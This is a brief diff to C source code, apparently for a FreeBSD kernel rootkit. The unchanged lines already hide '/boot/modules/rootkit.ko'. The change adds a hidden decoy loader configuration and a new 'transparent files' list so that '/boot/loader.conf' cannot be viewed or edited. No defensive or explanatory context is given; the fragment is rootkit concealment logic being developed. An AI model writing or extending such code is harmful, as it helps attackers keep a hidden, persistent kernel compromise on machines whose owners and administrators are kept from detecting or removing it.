@@ -36,6 +36,14 @@
 #define NUM_HIDDEN_FILES 2
 static const char *hidden_files[NUM_HIDDEN_FILES] = {
 	"/boot/modules/rootkit.ko",
+	"/boot/loader.conf.transparent"
+};
+
+/* Transparent files.
+ * Transparent files are files that should not be hidden but must not be
+ * viewed or directly edited. */
+#define NUM_TRANSPARENT_FILES 1
+static const char *transparent_files[NUM_TRANSPARENT_FILES] = {
 	"/boot/loader.conf",
 };
 
